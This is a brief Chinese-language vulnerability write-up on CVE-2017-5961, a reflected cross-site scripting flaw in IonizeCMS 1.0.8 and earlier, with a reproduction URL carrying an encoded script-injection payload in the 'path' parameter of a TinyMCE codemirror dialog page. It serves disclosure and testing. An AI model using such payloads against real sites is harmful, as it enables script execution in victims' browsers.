---
title: （CVE-2017-5961）IonizeCMS xss
id: zhfly2977
---

# （CVE-2017-5961）IonizeCMS xss

## 一、漏洞简介

该漏洞源于在‘path’HTTP GET参数传递到‘ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php’URL时，程序没有充分地过滤此参数中用户提交的数据。攻击者可利用该漏洞在浏览器中执行任意的HTML和脚本代码。

## 二、漏洞影响

<=Ionize 1.0.8

## 三、复现过程

```
http://0-sec.org/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22 
```